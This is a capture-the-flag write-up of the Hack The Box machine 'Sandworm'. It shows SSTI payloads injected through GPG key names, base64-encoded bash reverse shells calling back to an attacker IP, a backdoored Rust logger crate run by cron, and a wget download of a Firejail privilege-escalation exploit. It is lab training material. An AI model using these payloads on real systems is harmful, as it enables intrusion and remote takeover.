## HTB Sandworm (Medium) - Writeup

Difficulty: Medium

This box revolves around a Flask web app with GPG-based functionality.  
By injecting SSTI payloads via GPG key names and signature verification, we achieve RCE.  
Enumeration reveals credentials and a Rust binary (tipnet) run via cron as root, which imports a custom logger crate we can write to—allowing for privilege escalation.  
Finally, we exploit a known Firejail vulnerability (CVE-2022-31214) to escalate to root.  

---

## Nmap 

#### The nmap scan revealed three open ports:  

![obraz](https://github.com/user-attachments/assets/f64289ac-22cf-4e03-8e80-8c45e9321d41)  


## Port 80 - Website  

This website just redirects to httpsL//ssa.htb  
We'll add it to /etc/hosts and move to 443  



## Port 443 - https website  

![obraz](https://github.com/user-attachments/assets/46fd1c0b-d1ad-4212-b0b6-24db7e905246)  

After quick enumeration I found that this app is written in flask.  
The site exposes three main routes:  

+  /contact
+  /pgp
+  /guide

/pgp contains pgp key, first thing that came to my mind is to import it to kali.  
It can be done by putting it in a file and using:  
```
gpg --import key
```
![obraz](https://github.com/user-attachments/assets/557ef4a9-d850-46b5-8f67-f8acbc623bde)

Now we will be able to encrypt messages with this key.  
On the contact page we can send encrypted messages:  

![obraz](https://github.com/user-attachments/assets/3cde4962-4abd-4770-a569-153e8727bfc4)

On the guide page there are three functionalities:  
+  Decrypting
+  Encrypting
+  Verifying Signatures

Let's test them one by one starting with Decryption.  
Our goal is to observe how this site works to look for anything that might be abused.  

It can be encrypted with the following command:  
```
gpg --armor --recipient atlas@ssa.htb --encrypt message.txt -o -
```

![obraz](https://github.com/user-attachments/assets/94b3c21b-dbf1-4b70-8d03-5bc6bf9c7c39)

We can now paste this message and click on "Decrypt".  

![obraz](https://github.com/user-attachments/assets/15b62683-bf4e-4ab7-84a9-228936d57492)

It just decrypts but there is nothing unusual.  

The second section of the site allows us to provide our public key, and it responds with a message encrypted using that key.  
For it to work we need to generate a key:  
```
gpg --full-key-gen
```
It will prompt with some questions, go with any values you like doesn't matter.  

![obraz](https://github.com/user-attachments/assets/ed288c89-4d7d-4e8d-bfd2-26be4f7b36dd)

Site allows us to paste the key, for that we need to print it with coresponding key ID:  
```
gpg --armor --export B8A1EE1855AA25C45247A84A3B30A676B4804748 
```
![obraz](https://github.com/user-attachments/assets/e2645220-4377-4390-89a5-e1d66039a48b)


Now if we paste this key they will use it to decrypt some message:  

![obraz](https://github.com/user-attachments/assets/7da727ae-2e57-4ad6-b6a7-dc2a1aca876d)  

We can copy it and decrypt because we own the key:  
```
gpg --decrypt msg.txt
```

![obraz](https://github.com/user-attachments/assets/fa9eb5f2-1da1-454f-be7f-4e0dfab3f960)

Nothing unusual so far.  

Third and last section allows to verify a signature.  
With pgp we can sign a message, let's do it:  

![obraz](https://github.com/user-attachments/assets/7ffdb0b3-5c0f-4146-b474-73a584a6e64f)


Now signature will be save into test.txt.asc:  

![obraz](https://github.com/user-attachments/assets/e56b426e-16c3-448e-8d07-55c22587a8a6)

If we paste the key and the signature into the site and click on verify signature we get:  

![obraz](https://github.com/user-attachments/assets/52aea4bb-433b-4a03-85c4-ec91254417f6)

And now is is something very intresting.  
It uses most likely some templating engine.  
There is possibility that it will contain SSTI vulnerability.  

Now we want to look for a parameter that is being generated and that we control.  
In this case template contains key name that we control when generating a key:  

![obraz](https://github.com/user-attachments/assets/2738ee0f-ecf9-47f2-8bf9-de1e5ded5a49)


## SSTI - exploitation  

First we need to verify if it's vulnerable with a poc payload.  
Previously we generated a key with full generation command, but there is an option to generate it faster:  
```
{% raw %} gpg --quick-generate-key "{{7*7}}" default default never {% endraw %}
```
![obraz](https://github.com/user-attachments/assets/317c2949-cc4f-4f23-a373-7c49353dde0e)  

Now we need to create a message and export the key:  
```
echo "malicious" > text
gpg --armor --export 24A027F729D76AEE8DE74EEEFD61AF656FB0700A
```

![obraz](https://github.com/user-attachments/assets/6a7df3d1-fed6-4d61-b1b5-fadf944cd8de)  

After that we want to sign a message and export it's signature:  
```
gpg --local-user 24A027F729D76AEE8DE74EEEFD61AF656FB0700A --clearsign text
cat text.asc
```
![obraz](https://github.com/user-attachments/assets/2089bbb7-eeea-4f14-b06a-149c58f0cc21)

Now paste both of then into the site and click "Verify Signature".  

![obraz](https://github.com/user-attachments/assets/a8b189e1-ae41-4f32-8373-38bbb72e3e07)

It performed multiplication which means that the templating engine is vulnerable to SSTI.  

Before we test for code execution we can dump the config:  
```
{% raw %} gpg --quick-generate-key "{{ config }}" default default never {% endraw %}
```

![obraz](https://github.com/user-attachments/assets/f21dc65b-7ef4-407c-8949-cb14929c25f7)

Config revealed mysql credentials:  
+  mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA

Of course we can try it for ssh but it didn't work.  

It's time to get malicious code execution, I was lucky and simple payload worked:  
```
{% raw %}  gpg --quick-generate-key "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" ed25519 default never {% endraw %}
```
![obraz](https://github.com/user-attachments/assets/1f3c58e4-da7f-4247-bf80-abecb82d512e)

It worked, now it's time to use reverse shell, for syntax purposes I will base65 encode it.  
```
{% raw %}  {{request.application.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS85MDA1ICAwPiYxCg== | base64 -d | bash').read()}} {% endraw %}
```

![obraz](https://github.com/user-attachments/assets/9dc1049a-1f12-48b0-bc25-9064d3dbc392)  

Now we need to start a listener and paste payload into the website:  

![obraz](https://github.com/user-attachments/assets/7171f5d1-9c1c-432e-9985-f35931e64238)  





## Privilege Escalation  

If we check environment variables we can see that we're in jail:  
```
export -p
```
![obraz](https://github.com/user-attachments/assets/63b719be-763d-4512-8bb6-79297882c136)

+  container="firejail"

It means we're in limited shell.  
Some enumeration led to an intresting file:  
+  .config/httpie/sessions/localhost_5000/admin.json

httpie - is a command-line HTTP client designed to make interacting with APIs and web services as simple and human-friendly as possible.  

![obraz](https://github.com/user-attachments/assets/a4e7935e-89d1-4afb-8628-0bdde6db189a)

It had credentials in plain text:  
+  silentobserver:quietLiketheWind22

They work for ssh:  

![obraz](https://github.com/user-attachments/assets/e42f7ed4-695e-4599-9c17-e7b32e76f261)




## Privilege Escalation 2

Now we can retrieve a flag:  

![obraz](https://github.com/user-attachments/assets/9881915f-508e-44e8-8d77-c68026bef4eb)

It's time for some basic enumeration:  
sudo -l  ->  nothing  
find / -perm -u=s 2>/dev/null  ->  revealed non standard SUID binaries:  
+  /opt/tipnet/target/debug/tipnet
+  /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
+  /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
+  /usr/local/bin/firejail

let's leave it for now and check for crons running with pspy64:  
```
https://github.com/DominicBreuker/pspy/releases
```

![obraz](https://github.com/user-attachments/assets/443dd272-4587-4ce9-af8f-06195c0ce879)

![obraz](https://github.com/user-attachments/assets/dd091843-3156-49d6-84f3-a6134e739536)


It revealed some crons:  
+  /bin/bash /root/Cleanup/clean_c.sh  
+ {% raw %}  /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline {% endraw %}

There is a tipnet binary written in rust, I'll paste it's source code here:  
```
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");


    let mode = get_mode();
    
    if mode == "" {
            return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

        let valid = false;
        let mut mode = String::new();

        while ! valid {
                mode.clear();

                println!("Select mode of usage:");
                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

                io::stdin().read_line(&mut mode).unwrap();

                match mode.trim() {
                        "a" => {
                              println!("\n[+] Upstream selected");
                              return "upstream".to_string();
                        }
                        "b" => {
                              println!("\n[+] Muscular selected");
                              return "regular".to_string();
                        }
                        "c" => {
                              println!("\n[+] Tempora selected");
                              return "emperor".to_string();
                        }
                        "d" => {
                                println!("\n[+] PRISM selected");
                                return "square".to_string();
                        }
                        "e" => {
                                println!("\n[!] Refreshing indeces!");
                                return "pull".to_string();
                        }
                        "q" | "Q" => {
                                println!("\n[-] Quitting");
                                return "".to_string();
                        }
                        _ => {
                                println!("\n[!] Invalid mode: {}", mode);
                        }
                }
        }
        return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```

I don't know rust well but from quick analysis it loads module called "logger".  
We can look for this module with this command:  
```
find / -name logger* 2>/dev/null
```
![obraz](https://github.com/user-attachments/assets/274209b4-b960-4931-91d6-90bb82095d8c)

it is located in:  
+  /opt/crates/logger

Previously we found a cron running cargo run:  
+  /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline

cargo run rebuild the binary everytime it is ran.  
Let's check source code of logger module:  

![obraz](https://github.com/user-attachments/assets/ba9a0ee8-c9a4-4729-ac05-b2fb91d896ad)

Luckily we have write privilege over it:  

![obraz](https://github.com/user-attachments/assets/98107a81-7c6e-4212-8fcd-3fe00c1a6f5f)

We can simply add command at the bottom and one import at the top:  
```
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }

Command::new("sh")
        .arg("-c")
        .arg("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS85MDAwICAwPiYxCg== | base64 -d | bash")
        .output()
        .expect("failed");
}
```

![obraz](https://github.com/user-attachments/assets/8137b1aa-d61e-4c1f-87de-b1e6fa1c8b52)

After two minutes we get a shell as atlas:  

![obraz](https://github.com/user-attachments/assets/188f77ad-89ce-4c95-a09c-aa1afe931bd8)




## Priv Esc to root  

There is an exploit for firejail:  
```
https://www.openwall.com/lists/oss-security/2022/06/08/10?source=post_page-----55cdb93e53c8---------------------------------------
```
They attached a script to the article:  
```
https://www.openwall.com/lists/oss-security/2022/06/08/10/1
```

It also depends if it's going to work on the firejail's version:  

![obraz](https://github.com/user-attachments/assets/80fce6f5-07e0-4e8f-9110-8aad66762194)

Now we can download exploit give it execute permission and run it:  
```
wget http://<attacker ip>/firejail.py
chmopd +x firejail.py
python3 firejail.py
```

![obraz](https://github.com/user-attachments/assets/9c7b3c2a-4e36-40bc-b934-9978601df45e)

Now we need to re-run previous exploit with library hijacking to get the second terminal.  
After that in the second terminal we can run:  
```
firejail --join=23193
```
and then change user with:  
```
su
```
![obraz](https://github.com/user-attachments/assets/f1a3aa5c-b891-4c65-b347-db9448a15435)

Thanks for reading!!  





























